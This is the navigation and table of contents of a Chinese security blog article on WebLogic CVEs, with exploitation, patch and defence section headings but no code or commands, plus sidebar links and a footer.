<span class="toc-text">(1) 反序列化入口点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0-1"><span class="toc-number">3.3.2.2.</span> <span class="toc-text">(2) 利用链构造</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87%E6%9C%BA%E5%88%B6"><span class="toc-number">3.3.2.3.</span> <span class="toc-text">(3) 黑名单绕过机制</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">3.3.3.</span> <span class="toc-text">3. 漏洞利用流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E8%A1%A5%E4%B8%81%E4%B8%8E%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">3.3.4.</span> <span class="toc-text">4. 补丁与防御措施</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%8A%80%E6%9C%AF%E6%84%8F%E4%B9%89%E4%B8%8E%E5%90%AF%E7%A4%BA"><span class="toc-number">3.3.5.</span> <span class="toc-text">5. 技术意义与启示</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B"><span class="toc-number">3.3.6.</span> <span class="toc-text">6.漏洞复现流程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87-1"><span class="toc-number">3.3.6.1.</span> <span class="toc-text">一、环境准备</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.3.6.2.</span> <span class="toc-text">二、漏洞利用步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8F%E7%B1%BB%E6%96%87%E4%BB%B6"><span class="toc-number">3.3.6.2.1.</span> <span class="toc-text">1. 生成恶意类文件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-%E5%90%AF%E5%8A%A8-HTTP-%E6%9C%8D%E5%8A%A1%E6%89%98%E7%AE%A1%E6%81%B6%E6%84%8F%E7%B1%BB"><span class="toc-number">3.3.6.2.2.</span> <span class="toc-text">2. 启动 HTTP 服务托管恶意类</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-%E5%90%AF%E5%8A%A8%E6%81%B6%E6%84%8F-RMI-%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.3.6.2.3.</span> <span class="toc-text">3. 启动恶意 RMI 服务</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4-%E5%8F%91%E9%80%81-Payload-%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.6.2.4.</span> <span class="toc-text">4. 发送 Payload 触发漏洞</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.3.6.3.</span> <span class="toc-text">三、验证漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-CVE-2018-2894"><span class="toc-number">3.4.</span> <span class="toc-text">7.CVE-2018-2894</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF%E4%B8%8E%E5%85%A5%E5%8F%A3%E7%82%B9"><span class="toc-number">3.4.1.</span> <span class="toc-text">1. 漏洞背景与入口点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6"><span class="toc-number">3.4.2.</span> <span class="toc-text">2. 漏洞触发机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.4.3.</span> <span class="toc-text">3. 漏洞利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82"><span class="toc-number">3.4.4.</span> <span class="toc-text">4. 漏洞技术细节</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E9%98%B2%E5%BE%A1%E4%B8%8E%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">3.4.5.</span> <span class="toc-text">5. 防御与修复建议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E4%B8%8E%E6%84%8F%E4%B9%89"><span class="toc-number">3.4.6.</span> <span class="toc-text">6. 漏洞影响与意义</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-CVE-2020-14882"><span class="toc-number">3.5.</span> <span class="toc-text">8.CVE-2020-14882</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF%E4%B8%8E%E5%BD%B1%E5%93%8D"><span class="toc-number">3.5.1.</span> <span class="toc-text">1. 漏洞背景与影响</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">3.5.2.</span> <span class="toc-text">2. 核心原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1-%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E8%B7%AF%E5%BE%84%E6%A0%A1%E9%AA%8C%E7%BC%BA%E9%99%B7"><span class="toc-number">3.5.2.1.</span> <span class="toc-text">2.1 静态资源路径校验缺陷</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2-%E8%AF%B7%E6%B1%82%E5%88%86%E6%B4%BE%E4%B8%8E%E6%9D%83%E9%99%90%E6%A0%A1%E9%AA%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">3.5.2.2.</span> <span class="toc-text">2.2 请求分派与权限校验流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="toc-number">3.5.2.3.</span> <span class="toc-text">2.3 生命周期触发点</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE%E7%A4%BA%E4%BE%8B"><span class="toc-number">3.5.3.</span> <span class="toc-text">3. 漏洞利用链示例</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3-1-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%EF%BC%88CVE-2020-14882%EF%BC%89"><span class="toc-number">3.5.3.1.</span> <span class="toc-text">3.1 权限绕过（CVE-2020-14882）</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E8%A1%A5%E4%B8%81%E4%B8%8E%E4%BF%AE%E5%A4%8D%E6%9C%BA%E5%88%B6"><span class="toc-number">3.5.4.</span> <span class="toc-text">4. 补丁与修复机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%80%BB%E7%BB%93-1"><span class="toc-number">3.5.5.</span> <span class="toc-text">5. 总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-CVE-2020-14883"><span class="toc-number">3.6.</span> <span class="toc-text">9.CVE-2020-14883</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF%E4%B8%8E%E5%AE%9A%E4%BD%8D"><span class="toc-number">3.6.1.</span> <span class="toc-text">1. 漏洞背景与定位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-1"><span class="toc-number">3.6.2.</span> <span class="toc-text">2. 核心原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1-%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="toc-number">3.6.2.1.</span> <span class="toc-text">2.1 漏洞触发点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2-%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E6%B5%81%E7%A8%8B"><span class="toc-number">3.6.2.2.</span> <span class="toc-text">2.2 关键代码流程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%8E%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF"><span class="toc-number">3.6.3.</span> <span class="toc-text">3. 利用链与攻击场景</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3-1-%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.6.3.1.</span> <span class="toc-text">3.1 利用条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-2-%E5%85%B8%E5%9E%8B%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.6.3.2.</span> <span class="toc-text">3.2 典型攻击步骤</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E8%A1%A5%E4%B8%81%E4%B8%8E%E4%BF%AE%E5%A4%8D%E6%9C%BA%E5%88%B6-1"><span class="toc-number">3.6.4.</span> <span class="toc-text">4. 补丁与修复机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%80%BB%E7%BB%93%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="toc-number">3.6.5.</span> <span class="toc-text">5. 总结与防御建议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2023-21839"><span class="toc-number">3.7.</span> <span class="toc-text">CVE-2023-21839</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF%E4%B8%8E%E5%BD%B1%E5%93%8D-1"><span class="toc-number">3.7.1.</span> <span class="toc-text">1. 漏洞背景与影响</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-2"><span class="toc-number">3.7.2.</span> <span class="toc-text">2. 核心原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1-%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6"><span class="toc-number">3.7.2.1.</span> <span class="toc-text">2.1 漏洞触发机制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2-%E5%85%B3%E9%94%AE%E7%BB%84%E4%BB%B6%E7%BC%BA%E9%99%B7"><span class="toc-number">3.7.2.2.</span> <span class="toc-text">2.2 关键组件缺陷</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.7.3.</span> <span class="toc-text">3. 漏洞利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3-1-%E5%85%B8%E5%9E%8B%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.7.3.1.</span> <span class="toc-text">3.1 典型攻击步骤</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-2-%E5%B7%A5%E5%85%B7%E4%BE%9D%E8%B5%96"><span class="toc-number">3.7.3.2.</span> <span class="toc-text">3.2 工具依赖</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.7.4.</span> <span class="toc-text">4.漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%B8%80%EF%BC%9A%E4%BD%BF%E7%94%A8%E8%87%AA%E5%8A%A8%E5%8C%96-PoC-%E5%B7%A5%E5%85%B7"><span class="toc-number">3.7.4.1.</span> <span class="toc-text">方式一：使用自动化 PoC 工具</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%BA%8C%EF%BC%9A%E6%89%8B%E5%8A%A8%E7%BC%96%E5%86%99-Java-PoC"><span class="toc-number">3.7.4.2.</span> <span class="toc-text">方式二：手动编写 Java PoC</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%BF%AE%E5%A4%8D%E4%B8%8E%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD"><span class="toc-number">3.7.5.</span> <span class="toc-text">4. 修复与缓解措施</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#4-1-%E5%AE%98%E6%96%B9%E8%A1%A5%E4%B8%81"><span class="toc-number">3.7.5.1.</span> <span class="toc-text">4.1 官方补丁</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-2-%E4%B8%B4%E6%97%B6%E7%BC%93%E8%A7%A3%E6%96%B9%E6%A1%88"><span class="toc-number">3.7.5.2.</span> <span class="toc-text">4.2 临时缓解方案</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%80%BB%E7%BB%93%E4%B8%8E%E5%90%AF%E7%A4%BA"><span class="toc-number">3.7.6.</span> <span class="toc-text">5. 总结与启示</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weblogic%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">Weblogic综合利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%89%AB%E6%8F%8F%EF%BC%8C%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.1.</span> <span class="toc-text">1.中间件扫描，服务信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">4.2.</span> <span class="toc-text">2.综合利用工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#T3%E5%8D%8F%E8%AE%AE%E5%92%8CIIOP%E5%8D%8F%E8%AE%AE%E5%AF%B9%E6%AF%94"><span class="toc-number">5.</span> <span class="toc-text">T3协议和IIOP协议对比</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8D%8F%E8%AE%AE%E6%A6%82%E8%BF%B0"><span class="toc-number">5.1.</span> <span class="toc-text">1. 协议概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%A0%B8%E5%BF%83%E7%89%B9%E6%80%A7%E5%AF%B9%E6%AF%94"><span class="toc-number">5.2.</span> <span class="toc-text">2. 核心特性对比</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AE%89%E5%85%A8%E6%80%A7%E5%AF%B9%E6%AF%94"><span class="toc-number">5.3.</span> <span class="toc-text">3. 安全性对比</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%85%B8%E5%9E%8B%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B"><span class="toc-number">5.4.</span> <span class="toc-text">4. 典型漏洞案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">5.5.</span> <span class="toc-text">5. 适用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%8A%A0%E5%9B%BA%E5%BB%BA%E8%AE%AE"><span class="toc-number">5.6.</span> <span class="toc-text">6. 配置与加固建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.7.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weblogic%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">Weblogic漏洞总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XMLDecoder%E7%BB%84%E4%BB%B6%E7%9B%B8%E5%85%B3CVE"><span class="toc-number">6.1.</span> <span class="toc-text">XMLDecoder组件相关CVE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-CVE-2017-3506-1"><span class="toc-number">6.1.1.</span> <span class="toc-text">1. CVE-2017-3506</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-CVE-2017-10271-1"><span class="toc-number">6.1.2.</span> <span class="toc-text">2. CVE-2017-10271</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-CVE-2019-2725-1"><span class="toc-number">6.1.3.</span> <span class="toc-text">3. CVE-2019-2725</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-CVE-2019-2729"><span class="toc-number">6.1.4.</span> <span class="toc-text">4. CVE-2019-2729</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebLogic-%E5%85%B6%E4%BB%96%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB%E6%80%BB%E7%BB%93"><span class="toc-number">6.2.</span> <span class="toc-text">WebLogic 其他常见漏洞分类总结</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1"><span class="toc-number">6.2.1.</span> <span class="toc-text">1. 反序列化漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87"><span class="toc-number">6.2.2.</span> <span class="toc-text">2. 未授权访问&#x2F;权限绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.2.3.</span> <span class="toc-text">3. 文件上传漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-SSRF%EF%BC%88%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-number">6.2.4.</span> <span class="toc-text">4. SSRF（服务器端请求伪造)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88RCE%EF%BC%89"><span class="toc-number">6.2.5.</span> <span class="toc-text">5. 远程代码执行（RCE）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">6.2.6.</span> <span class="toc-text">6. 配置错误</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">6.2.7.</span> <span class="toc-text">7. 信息泄露</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="toc-number">6.3.</span> <span class="toc-text">防御建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%87%E6%80%BB%E5%BD%92%E7%B1%BB"><span class="toc-number">6.4.</span> <span class="toc-text">汇总归类</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/16167/" title="提示词注入攻击(Prompt Injecting)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/AI%20Infra%20feature%20image-1.png?x-oss-process=style/img-to-webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="提示词注入攻击(Prompt Injecting)"/></a><div class="content"><a class="title" href="/posts/16167/" title="提示词注入攻击(Prompt Injecting)">提示词注入攻击(Prompt Injecting)</a><time datetime="2025-06-22T16:00:00.000Z" title="发表于 2025-06-23 00:00:00">2025-06-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/44081/" title="安卓逆向技术"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/5c4406f679dc69b549b48fa6_p17s2tfgc31jte13d51pea1l2oblr3.png?x-oss-process=style/img-to-webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="安卓逆向技术"/></a><div class="content"><a class="title" href="/posts/44081/" title="安卓逆向技术">安卓逆向技术</a><time datetime="2025-06-22T16:00:00.000Z" title="发表于 2025-06-23 00:00:00">2025-06-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/18965/" title="Android-JAVA开发基础"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/5c4406f679dc69b549b48fa6_p17s2tfgc31jte13d51pea1l2oblr3.png?x-oss-process=style/img-to-webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Android-JAVA开发基础"/></a><div class="content"><a class="title" href="/posts/18965/" title="Android-JAVA开发基础">Android-JAVA开发基础</a><time datetime="2025-06-15T16:00:00.000Z" title="发表于 2025-06-16 00:00:00">2025-06-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/60615/" title="JAVA内存马"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/java_logo_icon_168609.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JAVA内存马"/></a><div class="content"><a class="title" href="/posts/60615/" title="JAVA内存马">JAVA内存马</a><time datetime="2025-06-09T16:00:00.000Z" title="发表于 2025-06-10 00:00:00">2025-06-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/32372/" title="内网穿透技术"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网穿透技术"/></a><div class="content"><a class="title" href="/posts/32372/" title="内网穿透技术">内网穿透技术</a><time datetime="2025-05-23T16:00:00.000Z" title="发表于 2025-05-24 00:00:00">2025-05-24</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="workboard"><img class="workSituationImg boardsign" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/184064234.png" alt="网络安全行业初级从业者！~" title="网络安全行业初级从业者！~"/><div id="runtimeTextTip"></div></div></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2022 - 2025 By <a class="footer-bar-link" href="/" title="Takake" target="_blank">Takake</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com" title="GITHUB">GITHUB</a><a class="footer-bar-link" target="_blank" rel="noopener" href="https://chat.opengpt.lol" title="CHATGPT">CHATGPT</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">91</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">166</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">13</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://blog.takake.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https:/api.opengpt.lol/" title="GPT-API"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="GPT-API"/><span class="back-menu-item-text">GPT-API</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 站点动态</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/AI%E8%AF%AD%E8%A8%80%E5%A4%A7%E6%A8%A1%E5%9E%8B/" style="font-size: 0.88rem;">AI语言大模型<sup>1</sup></a><a href="/tags/APK/" style="font-size: 0.88rem;">APK<sup>2</sup></a><a href="/tags/Android/" style="font-size: 0.88rem;">Android<sup>1</sup></a><a href="/tags/CVE/" style="font-size: 